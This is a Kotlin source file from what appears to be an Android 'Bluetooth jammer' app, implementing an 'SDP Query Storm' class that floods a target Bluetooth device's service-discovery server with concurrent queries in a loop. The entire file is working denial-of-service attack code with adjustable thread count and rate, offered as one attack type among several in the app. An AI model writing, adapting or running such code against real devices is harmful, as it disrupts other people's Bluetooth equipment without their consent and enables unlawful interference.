package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothManager
import android.content.Context
import androidx.core.content.ContextCompat.getSystemService
import com.eikarna.bluetoothjammer.R
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * SDP Query Storm: repeatedly triggers service discovery (SDP) against the
 * target to saturate its SDP server with queries.
 */
class SdpFloodAttack(
    private val targetAddress: String,
    private val threads: Int = 8,
    private val rateDelayMs: Int = 0
) : BluetoothAttack {

    private var appContext: Context? = null
    override val displayName: String
        get() = appContext?.getString(AttackType.SDP_FLOOD.labelRes) ?: AttackType.SDP_FLOOD.fallbackLabel
    override val description: String
        get() = appContext?.getString(AttackType.SDP_FLOOD.descRes) ?: AttackType.SDP_FLOOD.fallbackDesc

    private var scope: CoroutineScope? = null
    @Volatile
    private var running = false

    override fun isRunning() = running

    @SuppressLint("MissingPermission")
    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        appContext = context.applicationContext
        val adapter = getSystemService(context, BluetoothManager::class.java)?.adapter
        if (adapter == null) {
            running = false
            return
        }
        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: IllegalArgumentException) {
            running = false
            return
        }

        val concurrency = threads.coerceIn(1, 16)
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        onLog("[SDP] " + context.getString(R.string.log_sdp_started, targetAddress, concurrency))
        scope!!.launch {
            var total = 0
            while (isActive && running) {
                val jobs = (1..concurrency).map {
                    launch {
                        runCatching { device.fetchUuidsWithSdp() }
                        total++
                    }
                }
                jobs.forEach { it.join() }
                if (total % 50 == 0) onLog("[SDP] " + context.getString(R.string.log_sdp_sent, total))
                jitterDelay(maxOf(200, rateDelayMs))
            }
            onLog("[SDP] " + context.getString(R.string.log_sdp_stopped, total))
        }
    }

    override fun stop() {
        running = false
        scope?.cancel()
        scope = null
    }
}
